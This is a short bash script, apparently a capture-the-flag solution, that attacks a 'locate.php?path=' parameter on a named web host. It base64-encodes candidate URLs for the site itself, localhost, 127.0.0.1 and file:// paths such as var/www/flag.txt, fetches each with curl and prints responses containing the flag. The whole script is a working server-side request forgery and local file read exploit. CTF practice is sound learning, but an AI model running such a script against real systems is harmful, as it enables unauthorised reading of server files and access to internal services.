#!/bin/bash
# author: techgaun
# soln for croatia/my site

url="http://webseccdn.tech/viewmypage/locate.php?path="
base_urls=("http://webseccdn.tech" "http://localhost" "http://127.0.0.1" "file://")

paths=("flag.txt" "www/flag.txt" "viewmypage/flag.txt" "viewmypage/www/flag.txt" "websecjobportal/mainframe.php" "var/www/flag.txt")

for base_url in "${base_urls[@]}"; do
    for path in "${paths[@]}"; do
        encoded=$(printf "${base_url}/${path}" | base64)
        target_url="${url}${encoded}"
        echo "Trying with ${target_url}"
        result=$(curl -sS "${target_url}")

        if grep 'flag' <<< ${result} > /dev/null 2>&1; then
            echo "${result}"
        fi
    done
done